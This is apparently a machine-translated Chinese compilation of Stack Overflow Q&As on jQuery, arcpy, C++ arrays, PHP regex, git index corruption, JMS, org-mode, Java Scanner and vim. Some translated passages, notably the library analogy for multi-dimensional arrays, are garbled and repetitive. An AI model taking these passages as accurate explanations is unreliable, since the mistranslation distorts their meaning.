如果您使用的是 ko 映射插件，您可以将 json 对象映射到 viewmodel 内的模型。例如，如果您正在获取人员列表，您可以将 json 映射到 viewModel.people。这样您就可以保持视图模型的其他属性不变。

# javascript - 通过给定值的属性选择元素

> ID：11583744
> 
> 赞同：1
> 
> 时间：2012-07-20T16:52:36.560
> 
> 标签：javascript, jquery

我有下表。我也有这个数组，其值对应于行**[52,24,12]**的 data-id 属性。对于每个数组值，表中将仅存在一行。我想为数组中存在的每一行增加计数列。例如，12 将更改为 13，32 将更改为 33，6 将更改为 7。首选 jQuery 解决方案，但是，本地 JavaScript 解决方案就足够了。谢谢

```
<table>
 <thead>
  <tr><td>count</td></tr>
 </thead>
 <tbody>
  <tr data-id="24"><td>32</td></tr>
  <tr data-id="52"><td>12</td></tr>
  <tr data-id="42"><td>4</td></tr>
  <tr data-id="84"><td>2</td></tr>
  <tr data-id="12"><td>6</td></tr>
 </tbody>
</table> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T17:00:28.103

[像这样](http://jsfiddle.net/GgqLe/1/)的东西应该可以解决问题

```
var indices = [52, 24, 12];

//loop through each array entry
jQuery.each(indices, function(i, val) {

    var tr, value;

    //get the tr with the corresponding data-id, cache for reuse
    td = $('tr[data-id="' + val + '"] td');

    //just trying to be verbose
    value = td.text();           //get the text
    value = parseInt(value, 10); //parse the number off it
    value++;                     //increment

    //put the incremented values back
    td.text(value);

});​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T17:01:00.427

尝试：

**HTML**：

```
<table>
 <thead>
  <tr><td>count</td></tr>
 </thead>
 <tbody>
  <tr data-id="24"><td>32</td></tr>
  <tr data-id="52"><td>12</td></tr>
  <tr data-id="42"><td>4</td></tr>
  <tr data-id="84"><td>2</td></tr>
  <tr data-id="12"><td>6</td></tr>
 </tbody>
</table>​ 
```

**jQuery** :

```
indices = [52, 24, 12];

$('tr[data-id]').each(function() {
    if (indices.indexOf($(this).data('id')) == -1) {
        return;
    }
    var td = parseInt($(this).find('td').html());  
    $(this).find('td').html(td + 1);
}); 
```

**JsFiddle**：http: [//jsfiddle.net/Xc7JC/1/](http://jsfiddle.net/Xc7JC/1/)

享受和好运！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T17:01:19.663

您可以这样做以仅对数组中存在 ID 的行进行操作。

这可能比使用多个 jQuery 调用来查找数组中的每个 id 的解决方案更有效，因为这只会遍历行一次，而那些必须遍历表行 N 次。

```
<table id="myTable">
 <thead>
  <tr><td>count</td></tr>
 </thead>
 <tbody>
  <tr data-id="24"><td>32</td></tr>
  <tr data-id="52"><td>12</td></tr>
  <tr data-id="42"><td>4</td></tr>
  <tr data-id="84"><td>2</td></tr>
  <tr data-id="12"><td>6</td></tr>
 </tbody>
</table>

var rowList = [52, 24, 12];

$("#myTable tr").each(function() {
    var id = $(this).data("id");
    if (id && $.inArray(id, rowList) != -1) {
        var cell = $(this).find("td");
        cell.text(parseInt(cell.text(), 10) + 1);
    }
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-20T17:07:49.380

试试这个（我正在使用来自 underscorejs.org 的 lib）

```
_.each([52,24,12], function (item) {
    var td = $('tr[data-id=' + item + '] td');
    td.text(parseInt(td.text()) + 1);
}); 
```

或不带下划线：

```
var a = [52,24,12]; 
for (var i = 0; i < a.length; ++i) {
    var td = $('tr[data-id=' + a[i] + '] td');
    td.text(parseInt(td.text()) + 1);
} 
```

[http://jsfiddle.net/ACJ9r/](http://jsfiddle.net/ACJ9r/)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-20T17:14:10.353

你可以这样做，

**[现场演示](http://jsfiddle.net/rajaadil/EMTpQ/1/)**

```
arr = [52,24,12];
$('tr').each(function(){
    if($.inArray($(this).data('id'), arr) > -1)
        $(this).children('td').text(+$(this).children('td').text()+1);
});​ 
```

# python - Python arcpy.mapping和刷新文档

> ID：11583746
> 
> 赞同：1
> 
> 时间：2012-07-20T16:52:40.750
> 
> 标签：python, arcpy

有什么方法可以在不保存文档的情况下在 python 中使用新添加的图层刷新 ArcMap (.mxd) 文档？

我已经使用 python 完成了一系列任务的自动化，最后一步是将输出转储到 arcmap 文档中并弹出文档，以便脚本用户可以查看输出数据并决定他们是否/在哪里喜欢保存.mxd。

我创建了一个我在脚本中引用的 Default.mxd 文档，但我想将其保持为“只读”，以便用户被迫手动保存自己的文档。但是，使用 arcpy.mapping 模块我无法“看到” mxd 中的数据，除非我保存它。有没有办法解决？

下面是我要完成的脚本示例。

```
# Import arcpy module
import os
import arcpy

FGDB = "C:\...\SomeFGDB.gdb"
arcpy.env.workspace = FGDB

RASTER1 = FGDB+"\\RASTER1"
RASTER2 = FGDB+"\\RASTER2"

DefaultMXD = r"C:\...\Default.mxd"
mxd = arcpy.mapping.MapDocument(DefaultMXD)
df = arcpy.mapping.ListDataFrames(mxd, "*")[0]

RASTER1_LYR = arcpy.mapping.Layer(RASTER1)
RASTER2_LYR = arcpy.mapping.Layer(RASTER2)

mxd.activeView = df.name

arcpy.mapping.AddLayer(df, RASTER2_LYR,"TOP")
arcpy.mapping.AddLayer(df, RASTER1_LYR,"TOP")

extent = RASTER1.getExtent()
df.extent = extent

mxd.activeView = df.name
arcpy.RefreshTOC()
arcpy.RefreshActiveView()

##########################################
#I would rather not save the default MXD
#mxd.save()
##########################################

del mxd, df

os.startfile(DefaultMXD) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-19T01:38:29.773

如果不以某种方式保存更改，这是行不通的。想想看。您对脚本所做的是更改 mxd 的内存副本。如果不写出来，就无法打开该副本的另一个实例。我将首先使用以下内容复制默认值：

```
DefaultMXD = r"C:\...\Default.mxd"
newmxd = r'c:\temp\temp.mxd'
shutil.copy2(DefaultMXD, newmxd) 
```

然后对 newmxd 进行更改，保存并使用 os.startfile 或 subprocess.Popen 打开它。这使您的 Default.mxd 保持不变，这就是我认为您想要的。

祝你好运，迈克

# c++ - n 维 c++ 数组。这怎么可能？

> ID：11583747
> 
> 赞同：4
> 
> 时间：2012-07-20T16:52:40.987
> 
> 标签：c++, matrix, multidimensional-array

当 GCC 允许我这样做时，我感到很困惑：

```
int t[10][10][10][10][10]; 
```

我意识到`int i[N][N]`是一个`NxN`矩阵，其中第一个`N`表示行，第二个表示列。此外，第三个`N`表示`int i[N][N][N]`深度，为我们提供了一个 3d 维数组。

我不明白什么`int i[N][N][N][N]`和超越的意思。

第四个维度是时间，但这不适用于这里。

那么，这是否意味着当我到达第三个时，我可以让逻辑消失？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-07-20T16:57:52.680

我发现一个库类比对于可视化多维数组非常有用：

*   8维数组是一个库
*   7维数组是图书馆的一层
*   6维数组是图书馆地板上的一个房间
*   5维数组是图书馆楼层房间里的书柜
*   4维数组是图书馆地板上房间书柜中的架子
*   3维数组是图书馆地板上房间书架上书架上的一本书
*   二维数组是书架上书架上书架上书架上书架上书房地板上的一页
*   一维数组是书架上书架上书架上书架上书架上书架上书架上书架上的一条线
*   0维数组是书架上书架上书架上书页上一行中的一个字符在图书馆地板上的房间里

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-07-20T16:55:04.777

在数学世界中，维数无关紧要。它最终会达到一个无法再想象它的地步。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-07-20T16:59:48.370

尺寸就是您想要制作的任何尺寸。例如，只有在处理这些概念时，深度和时间才有意义。

*它不一定是关于空间和时间*的。事实上，C++ 标准称它们为*extents*。

假设您有十种不同的奶酪，并且您想评估某人以某种特定顺序偏爱它们的可能性。您可以将其存储在您`int t[10][10][10][10][10];`的 , 中分别表示：最喜欢的奶酪、第二喜欢的奶酪、第三喜欢的奶酪、第四喜欢的奶酪、第五喜欢的奶酪和最不喜欢的奶酪。某人喜欢按 5-4-6-3-2-1 顺序排列的奶酪的可能性将表示为`t[5][4][6][3][2][1]`。

关键是，该语言没有将域语义附加到范围。这取决于你。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-07-20T16:57:12.833

N 维数组不仅仅是 C++ 的东西。它出现在数学、物理学、其他各种科学等领域。

这是一个示例：假设您想按位置 (x,y,z)、时间和“哪个用户生成数据”来索引数据。对于在 x1、y1、z1、time1 收集并由 user1 生成的数据点，您可以将其保存为`dataArray[x1][y1][z1][time1][user1] = myNewData`.

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-20T17:16:56.770

在编程中，不要从传统几何的角度来考虑多维数组，除非您直接尝试表示世界。最好将每个连续的“维度”视为另一个包含数组的数组。有几个用例可能会出现这种情况。但是，如果您使用超过三个维度，我将不再将其视为数组甚至“数组数组”，我更喜欢树，因为它们更接近于您对需要超过 3 层深度的东西进行编程的方式。

一个例子是一棵树，你有一个根节点，它的节点也有节点。如果你想对某样东西进行排序，那么一棵树是一个很棒的工具。假设您想对一堆随机出现的数字进行排序。您将输入根中的第一个数字。如果第一个数字是 5，下一个数字是 7，那么您将把 7 放在根节点 5 的“右侧”。如果您得到一个 3，然后是 4，您将把 3 插入到5 的“左”，然后是 3 的“右”的 4。如果您按顺序遍历这棵树（总是从树的左边向下走，只有在没有新节点时才返回，然后向右走)，你最终会得到一个排序列表：3、4、5、7。

```
 5
    /    \
   3      7
     \
      4 
```

在这里，您可以看到树状结构。如果您在 C 中执行此操作，您将使用结构，它看起来像这样（我使用的是伪代码）：

```
struct Node{
     int val;
     Node left;
     Node right;
} 
```

有很多关于二叉树的材料（我一直在解释），但主要是我希望你摆脱数组“就像空间中的维度”的概念，而不仅仅是可以存储元素的数据结构. 有时二叉树或其他数据结构过于复杂，5 维或更多维数组可能更方便存储数据。我现在想不出一个例子，但它们以前被使用过。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-07-02T00:20:22.260

作为物理 3 维存在，我们无法“可视化”第 4、第 5、第 6（或更高）物理维度所代表的内容。

**第四维度会将我们的感知扩展到第四方向**，该方向与我们自然感知的高度、宽度和深度方向正交。
是的 - 几何变得很奇怪！

为了让我们对这个想法有一种感觉，[在这段视频中，](http://www.youtube.com/watch?v=39K9SSyOxIY) **卡尔萨根**想象了一个完美平坦的 2d 生物（一个小正方形），生活在 2d 世界中，遇到一个神秘的 3d 生物会是什么感觉。
这个 3d 生物（怀疑类似于苹果）主要存在于这个小方块无法“看到”的神秘 3d 维度中。它只感知苹果与它的二维平面世界相交的点，即它的**投影**......

以今天的标准来看，这段视频看起来已经过时了，但就物理/几何而言，它仍然是我见过的最好的解释。

# php - 如何在 urlencoded 字段上替换 php 通配符

> ID：11583751
> 
> 赞同：0
> 
> 时间：2012-07-20T16:53:03.550
> 
> 标签：php, replace, wildcard, urlencode

我有几个看起来像这样的编码字段：

317+NALON++RD%2C%2BGananoque%2C%2BOntario%2C%2B加拿大

简单的部分是用空格替换“+”。

我的挑战是用空格替换“%2C”或“%2B”。

有时“%”后面的文本可能不同，但总是两个字符。

我尝试使用 str_replace("%**", " ",urlencode($string)) 但没有运气。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:58:14.573

`str_replace()`不处理通配符。您可以为此使用正则表达式（只要您确定要将 ALL %** 更改为空格）：

```
preg_replace("/(%..|\+)+/", ' ', $string); 
```

这将使用您的`$string`（我认为它已经是 URL 编码的）并将所有 '+' 和 '%**' 替换为空格。~~请注意，它将用两个空格替换序列 '%2C%2B'（用于两个匹配项）~~编辑：正则表达式现在匹配任意数量的空格替换，并用一个空格替换所有空格。

# git - git status 给我一个错误：bad index file sha1 signature

> ID：11583753
> 
> 赞同：6
> 
> 时间：2012-07-20T16:53:07.180
> 
> 标签：git, indexing, git-submodules

在我的 git 存储库中，我对许多文件进行了 utf-8 转换，但只在 .git 目录下，所以没有触及 .git 目录。在此转换之前，我创建了一个新的测试分支，但现在我无法再使用我的 repo，我无法切换回 master。当我做：

```
git status 
```

或我得到的任何其他 git 命令：

```
error: bad index file sha1 signature 
fatal: index file corrupt 
fatal: 'git status --porcelain' failed in submodule core/kimai-mobile 
```

我搜索了一下，找到了命令：

```
rm -f .git/index 
```

在此之后：

```
git reset 
```

但这没有帮助。我不明白出了什么问题。然后我删除了“子模块”核心/kimai-mobile，突然我可以再次使用它！

我在这个目录中有另一个 git 存储库，我在其中通过转换销毁了另一个索引文件。我的问题是，我认为“主”存储库索引文件的意思。

现在它又开始工作了:)

* * *

我的问题是，尽管我的忽略列表中有这个子模块的整个文件夹，为什么 git 会查看这个子模块？

这是我的“主要”git 的忽略文件：

```
.gitignore

...
# kimai mobile
kimai-mobile
... 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-20T17:54:15.860

子模块是完整的 git 存储库。所以它们可以包含 .git 子目录（或至少一个指向它的链接）。

因此，如果您在根存储库的根目录中除 .git 之外的所有文件上使用您的工具，您仍然可以损坏子模块中的一些内部 .git 文件。

# javascript - jQuery：如何通过单击和更改功能更改输出？

> ID：11583754
> 
> 赞同：0
> 
> 时间：2012-07-20T16:53:08.593
> 
> 标签：javascript, jquery

我有一个表单，其中有一组可以添加和删除的字段。其中一个字段包含一组数字，这些数字相加以产生总和。你可以在这里看到一个例子：http: [//jsfiddle.net/beehive/HGJck/](http://jsfiddle.net/beehive/HGJck/)

这是我的问题：当我在表单首次加载时选择不同的数值时，总和不会改变，并且只有一组字段（没有添加）。它仅在我添加或删除字段后才会更改。我怎样才能解决这个问题？

```
$(document).ready(function() {
/* Add & Remove */
var removeButton = "<button id='remove'>Remove</button>";
$('#add').click(function() {
    $('div.container:last').after($('div.container:first').clone());
    $('div.container:last').append(removeButton);

    /* Sum */
    $(".number").change(function() {
        var combined = -10;
        $(".number").each(function() {
            combined += parseInt(this.value);
        });
        $("#sum").html(combined);
    }).trigger("change"); 

    return false;

});

$('#remove').live('click', function() {
    $(this).closest('div.container').remove();
});

});​ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:15:44.603

我将总和计算移到它自己的函数中，并将组合设置为 0 而不是 -10：**[jsFiddle 示例](http://jsfiddle.net/j08691/HGJck/2/)**

```
/* Add & Remove */
var removeButton = "<button id='remove'>Remove</button>";
$('#add').click(function() {
    $('div.container:last').after($('div.container:first').clone());
    $('div.container:last').append(removeButton);
    sum();
    return false;
});

$('#remove').live('click', function() {
    $(this).closest('div.container').remove();
    sum();
});

function sum() {
    /* Sum */
    $(".number").change(function() {
        var combined = 0;
        $(".number").each(function() {
            combined += parseInt(this.value);
        });
        $("#sum").html(combined);
    }).trigger("change");
}​ 
```

# vsto - Outlook 2007 AddStore() 折叠其他 PST

> ID：11583755
> 
> 赞同：1
> 
> 时间：2012-07-20T16:53:14.513
> 
> 标签：vsto, outlook-addin, outlook-2007, pst

我们的团队使用 VSTO 为 Outlook 2007 编写了加载项。在加载项中，我们创建 PST 并调用`Namespace.AddStore()`以将新的 PST 添加到商店。我们注意到，完成此操作后，其他一些扩展文件夹的 PST 在`AddStore()`被调用时会折叠。这是不受欢迎的行为。

Outlook 2010 中也存在此问题；但是，应用知识库文章 2598318 ( [http://support.microsoft.com/kb/2598318](http://support.microsoft.com/kb/2598318) ) 中描述的修补程序可以解决 Outlook 2010 的问题。事实上，这篇文章专门指出了这个问题：

> “使用包含 AddStore 方法的宏将 .pst 文件添加到 Outlook 2010 后，在 Outlook 2010 中展开的其他 .pst 文件会崩溃。”

我正在寻找 Outlook 2007 的解决方案。升级到 Outlook 2010 不是一种选择。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-02-04T14:28:52.450

对于感兴趣的人，此问题已由 Microsoft 修复，并在 2013 年 2 月 12 日的 Outlook 2007 修补程序包中提供。有关详细信息，请参阅[support.microsoft.com/kb/2760822](http://support.microsoft.com/kb/2760822)。

# asp.net-mvc-3 - ASP.Net MVC3 - Linq to SQL 或存储过程？

> ID：11583757
> 
> 赞同：2
> 
> 时间：2012-07-20T16:53:24.693
> 
> 标签：asp.net-mvc-3, linq-to-sql, stored-procedures

我是 MVC3 的新手，到目前为止，我一直在使用 Linq to SQL 和存储过程来处理我的应用程序。我不知道是使用 Linq to SQL 还是使用传统的存储过程。我在这里看到了一个博客， [http://weblogs.asp.net/jalpeshpvadgama/archive/2011/06/20/petapoco-with-stored-procedures.aspx](http://weblogs.asp.net/jalpeshpvadgama/archive/2011/06/20/petapoco-with-stored-procedures.aspx) ， 其中在实体框架模型中使用了存储过程。

但不确定哪种方法最适合 MVC3 应用程序？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T18:02:58.650

两种方法的概述：

**Linq 到 Sql：**

Linq to Sql 为您构建 sql。您可以大致了解您的 sql 将是什么样子，但是如果您对 DB 进行更复杂的调用，则出于性能目的控制 sql 的结果将变得更加困难。

可以按照[本文](http://msdn.microsoft.com/en-us/library/bb386961.aspx)查看生成的 Sql 代码，但是调整 sql 会变得有点麻烦，因为您必须运行代码才能查看生成的 sql。

**PetaPoco：**

使用 PetaPoco（请参阅完整[文档](http://www.toptensoftware.com/petapoco/)），您仍然可以使用实体来更新您的表（对于简单的 crud 操作很有用）。此外，您可以简单地为其添加一个存储过程名称，这样您就可以在 SQL Server Management Studio 中专注于您的 SQL 代码，从而轻松进行调整。

**我的意见：**

我发现使用 PetaPoco 比使用 Linq to Sql 更方便，因为您可以更好地控制 sql 代码。

还有一些性能方面的[考虑](http://www.toptensoftware.com/Articles/95/Benchmarking-SubSonic-s-Slow-Performance)。PetaPoco 似乎更快。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T18:42:22.687

没有“MVC3 应用程序的最佳方式”。这完全取决于您的应用程序的要求和您自己的品味。

有各种各样的解决方案，从手动编码查询到 PetaPoco 和 Dapper 等微型 ORM，以及您可以想到的所有花里胡哨的完整 ORM，例如 nHibernate 和 Entity Framework。

不过，您的应用程序的最佳解决方案很可能是这些的混合。我发现对于大多数常见的数据访问场景，ORM 运行良好。如果您需要更高的性能或对查询的控制，Micro ORM 是您的最佳选择。你可以随意混搭。

您可能会发现这篇[关于 StackOverflow 的数据访问策略的博客文章](http://samsaffron.com/archive/2011/03/30/How+I+learned+to+stop+worrying+and+write+my+own+ORM)很有趣。

# php - ErrorException 返回错误的文件和行

> ID：11583758
> 
> 赞同：4
> 
> 时间：2012-07-20T16:53:30.550
> 
> 标签：php, exception

在 file1.php 中：

```
set_error_handler('my_error_handler');
set_exception_handler('my_exception_handler');

function my_error_handler($errNo, $errStr, $errFile, $errLine, $whatever = null){
  // here ErrFile and $errLine are correct only for native funcs...
  throw New ErrorException($errStr, 0, $errNo, $errFile, $errLine);
}

function my_exception_handler($exception){
  print $exception->getLine(); // correct only for native functions
  print $exception->getFile(); // correct only for native functions
} 
```

在 file2.php 中，一个示例函数定义：

```
function foo($requiredArg){

} 
```

在 file3.php 中，调用 foo：

```
 foo(); 
```

产生：

> foo() 缺少参数 1，在第 2 行的 file3.php 中调用并定义...

消息是正确的，但是当我尝试获取文件并使用`$exception->getFile()`and `$exception->getLine()`（在我的异常处理程序中）时，我得到了定义 foo() 的文件和行，而不是调用它的位置...

但是使用原生 PHP 函数，我得到了调用函数的文件和行（这就是我想要的）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:31:45.687

它只是归结为最接近的第一。

当您使用核心或内置函数时，它们的定义包含在 PHP 的核心中。这意味着与用户定义的函数相比，该函数的定义不可用，用户定义的函数的定义很容易获得。

如果您在引用用户定义函数错误的函数内部运行`debug_backtrace();`or ，您将首先看到函数的定义，然后是函数的调用。如果您调用内部函数，您只会看到调用行，因为 PHP 无法告诉您脚本或包含文件中定义内部函数的代码行，因为它是在核心中定义的。`$exception->getTrace();``exception_handler`

这是错误处理的操作顺序。如果要获取调用该函数的实际行，可以查看跟踪并获取第二个数组对行号的引用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T17:24:24.900

好问题！

对于本机和用户定义的函数，事情似乎确实有所不同。但是，一件显而易见的事情是，如果它是本机的，则无法真正告诉您函数的定义位置，因为它是用 C 编写的，而不是 PHP。不过，在用户空间代码的情况下，找出它被调用的地方会很高兴。一种方法是仅从捕获的异常中解析该错误消息，您可以获得创建它的文件和行。

```
function my_exception_handler($exception)
{
    $message = $exception->getMessage();
    $file    = $exception->getFile();
    $line    = $exception->getLine();

    if(strpos($message, 'called in') !== false) {
        preg_match('/called in .*php/', $message, $matches);
        $file = str_replace('called in ', '', $matches[0]);

        preg_match('/on line \d/', $message, $matches);
        $line = str_replace('on line ', '', $matches[0]);
    }

    echo 'line: ' . $line . PHP_EOL;
    echo 'file: ' . $file . PHP_EOL;
} 
```

来自问题的基于输出的描述，已更改`my_exception_handler`：

```
line: 4
file: /tmp/file3.php 
```

# java - 设置 JMS 连接以使其自动重新连接的理想方式

> ID：11583761
> 
> 赞同：5
> 
> 时间：2012-07-20T16:53:41.713
> 
> 标签：java, jms, messenger

我目前正在为持久订阅编写一个信使服务（它可能最终不是持久的，我们仍在讨论这个问题），我正在寻找一些关于如何处理我们的服务器因任何原因暂时关闭并且我们需要的场景的建议自动重新订阅主题。这是它如何连接的示例代码：

```
public void DurableChatter(String broker, String username, String password)
{
    javax.jms.MessageProducer publisher = null;
    javax.jms.MessageConsumer subscriber = null;
    javax.jms.Topic topic = null;

    //Create a connection:
    try{
        javax.jms.ConnectionFactory factory;
        factory = (new progress.message.jclient.ConnectionFactory (broker));
        connection = factory.createConnection (username, password);

        //Durable Subscriptions are indexed by username, clientID and subscription name
        //It is a good proactice to set the clientID:
        connection.setClientID(CLIENT_ID);
        pubSession = connection.createSession(false,javax.jms.Session.AUTO_ACKNOWLEDGE);
        subSession = connection.createSession(false,javax.jms.Session.AUTO_ACKNOWLEDGE);
    }
    catch (javax.jms.JMSException jmse){
        System.err.println ("Error: Cannot connect to Broker - " + broker);
        jmse.printStackTrace();
        System.exit(1);
    }

    //Create Publisher and Durable Subscriber:
    try{

        topic = pubSession.createTopic(APP_TOPIC);
        subscriber = subSession.createDurableSubscriber(topic, "SampleSubscription");
        subscriber.setMessageListener(this);
        publisher = pubSession.createProducer(topic);
        connection.start();
    }
    catch (javax.jms.JMSException jmse){
        System.out.println("Error: connection not started.");
        jmse.printStackTrace();
        System.exit(1);
    }

    //Wait for user input

    try
    {
        System.out.println("Enter text to send as message and press enter.");
        java.io.BufferedReader stdin =
            new java.io.BufferedReader(new java.io.InputStreamReader(System.in));
        while (true)
        {
            String s = stdin.readLine();

            if(s == null){
                exit();
            }
            else if (s.length()>0)
            {
                try
                {
                    javax.jms.TextMessage msg = pubSession.createTextMessage();
                    msg.setText(username + ": " + s);
                    //Publish the message persistantly:
                    publisher.send(
                        msg,                               //message
                        javax.jms.DeliveryMode.PERSISTENT, //publish persistantly
                        javax.jms.Message.DEFAULT_PRIORITY,//priority
                        MESSAGE_LIFESPAN);                 //Time to Live
                }
                catch (javax.jms.JMSException jmse){
                    System.err.println("Error publishing message:" + jmse.getMessage());
                }
            }
        }
    }
    catch (java.io.IOException ioe)
    {
        ioe.printStackTrace();
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-10-20T12:03:06.050

你应该让你的客户[`implement javax.jmsExceptionListener`](https://docs.oracle.com/javaee/7/api/javax/jms/ExceptionListener.html)。

这将允许您的客户端在连接丢失时立即接收来自 JMS API 的回调，即使您的应用程序目前没有发布任何内容。

创建`Connection`，连接并启动它后，调用`connection.setExceptionListener(myListener)`. 另请参阅[Connection](https://docs.oracle.com/javaee/7/api/javax/jms/Connection.html#setExceptionListener-javax.jms.ExceptionListener-)的 Javadoc 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T17:08:47.453

您需要多快的故障检测速度？设置您的协议，以确保每个客户端至少每分钟发送一次消息（您需要在通信协议中添加一些新的“绒毛”keepalive 消息） - 任何未收到 keepalive 消息的客户端都可以安全地假设服务器已关闭并开始重新连接。

理想情况下，最好使用 UDP 广播而不是 JMS（用于开销）来完成这类事情，但我假设如果您有 UDP 广播作为选项，您将使用 jgroups 为您进行集群检测/故障转移/重新加入。

# emacs - 强制表格排序

> ID：11583763
> 
> 赞同：4
> 
> 时间：2012-07-20T16:53:47.893
> 
> 标签：emacs, org-mode

是否可以在 Emacs org-mode 中对给定的表或文件强制执行表排序？

当我说“强制”时，我的意思是表格应该在重新对齐时自动排序（例如当我点击`<TAB>` 或时`C-c C-c`）。我希望它根据第一行按字母顺序排序。

我可以设置一些属性来实现这一点吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-20T18:57:53.003

一种选择是“建议”您通过按键调用的功能。
[http://www.gnu.org/savannah-checkouts/gnu/emacs/manual/html_node/elisp/Defining-Advice.html](http://www.gnu.org/savannah-checkouts/gnu/emacs/manual/html_node/elisp/Defining-Advice.html)

```
;; advise a functions called by <TAB>
(defadvice org-table-next-field (around auto-sort-advice)
  "Sort table alphabetically according to the first rows"
  (progn
    ad-do-it
    (let ((pos (point)))
      ;; to to the first column
      (goto-char (org-table-begin))
      ;; one can change SORTING-TYPE (?a ?A ?n ?N ?t ?T)
      (org-table-sort-lines nil ?a)
      ;; restore position
      (goto-char pos))))

(ad-activate 'org-table-next-field) 
```

# sitecore - Sitecore 6 中的用户价值查找？

> ID：11583765
> 
> 赞同：0
> 
> 时间：2012-07-20T16:53:56.467
> 
> 标签：sitecore

我有一些外联网用户。每个用户都有一个由管理员维护的专用页面/项目。管理员应该能够手动将当前项目“连接”/引用到单个外联网用户。我想在模板上使用 valuelookup 类型或类似的东西。

但是我怎么能完成这个，因为用户存储在 ASP.NET 成员中，而不是直接存储在 Sitecore 中，就像他们在以前版本的 Sitecore 中一样。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T17:37:26.317

我认为你的想法是正确的。将用户的全名 (Domain\UserName) 存储在项目中，或者将项目 ID 存储在用户的配置文件中。如果您选择 Profile 路线，请务必在 Core DB 中更新 Sitecore 的用户模板，以便您可以在用户管理器中看到该值。

您还可以使用一个名为 IDTable 的 Sitecore 表，该表通常用于将 Sitecore 项目 ID 映射到外部数据。这可能是您最好的解决方案，因为用户配置文件可能很烦人......在查找/索引这些数据方面也是最有效的。查看导入数据的 Sitecore 示例以获取使用此 API 的示例。

# java - 输入不匹配异常

> ID：11583769
> 
> 赞同：1
> 
> 时间：2012-07-20T16:54:12.690
> 
> 标签：java, exception

我想问为什么我得到一个`InputMismathException`？

我已经声明了一个类型的变量，`double`当我为它分配一个点值时，例如（4.6）它抛出了我：

```
Exception in thread "main" java.util.InputMismatchException
    at java.util.Scanner.throwFor(Scanner.java:909)
    at java.util.Scanner.next(Scanner.java:1530)
    at java.util.Scanner.nextDouble(Scanner.java:2456)
    at Exercises.ComputingMeanAndStandartDeviation_5_21.main(ComputingMeanAndStandartDeviation_5_21.java:18) 
```

这是代码：

```
package Exercises;

import java.util.*;

public class ComputingMeanAndStandartDeviation_5_21 
{

    public static void main(String[] args) 
    {
        Scanner input = new Scanner(System.in);

        double sum = 0;
        double number = 1;
        double counter = 1;
        System.out.println("Enter ten numbers: ");
        while(counter<10)
        {
            number = input.nextDouble();
            sum +=number;
            counter ++;
        }

        System.out.println(sum + "   " + number + " " + counter);
        double mean = sum / counter;
        System.out.println("The mean is: " + mean);
    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:01:27.640

语言环境问题

```
Locale.setDefault(Locale.US);
Scanner input = new Scanner(System.in); 
```

美国十进制分隔符 "."(78.12) 而不是 ","(78,12)

# android - 3.2<= 如何选择正确的布局？

> ID：11583770
> 
> 赞同：-1
> 
> 时间：2012-07-20T16:54:12.500
> 
> 标签：android, android-layout

例如，从 3.2 开始，您可以使用 layout-sw600p 指定布局。现在，如果我同时指定 layout-ldpi/mdpi/hdpi/xhdpi 和 layout-sw600p，那么 3.2 及更高版本（例如 4.0）如何处理要使用的布局？它会选择 layout-xhdpi 还是 layout-sw600p ？

我无法自己测试它。由于我的手机仍在使用2.3。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T16:59:39.283

如果符合规则，`layout-sw600p`应该在之前考虑`layout-xlarge`（注意：`-xhdpi`是密度，与大小无关，通常不用于布局）。[在Android 开发者文档](http://developer.android.com/guide/topics/resources/providing-resources.html#AlternativeResources)`-swNNNdp`中的“表 2”中更高，这意味着它是一个更重要的限定符，这意味着它应该被首先考虑。

> 我无法自己测试它。由于我的手机仍在使用2.3。

然后在模拟器上测试。不要使用未测试的资源集限定符。

# vim - slimv.vim:: 无效的自动插入括号

> ID：11583773
> 
> 赞同：5
> 
> 时间：2012-07-20T16:54:29.493
> 
> 标签：vim, clojure, slimv

我在 MacVim 中使用 clojure 和 slimv.vim。

但是当我开始编写一些 clojure 代码时，我的缩进看起来并不好。它看起来像这样：

```
(def a
    (println "hello") 
     ) 
```

这让我有点困惑。我想使自动插入括号无效。你有什么主意吗？

提前致谢。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-20T22:10:50.630

亚瑟已经描述过了`,(`。`.vimrc`除此之外，您可以在( `let g:paredit_mode=0`)中全局关闭 paredit 。

但是，如果您不喜欢“电返回”（即在结束括号之前插入了一个额外的换行符），那么您可以通过`let g:paredit_electric_return=0`. `)`如果您在行尾按下，则会收集回电。因此，如果您在此之后按下`)`，`(println "hello")`则下一个关闭括号将跳起来产生：`(println "hello"))`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T18:08:37.220

听起来您可能在问“如何在 slimv 中关闭 paredit 模式？”

本教程介绍如何使用 paredit：[http ://kovisoft.bitbucket.org/tutorial.html](http://kovisoft.bitbucket.org/tutorial.html)

您可以通过键入禁用 paredit 模式`,(`

ps：paredit确实值得学习，虽然习惯了会让人沮丧

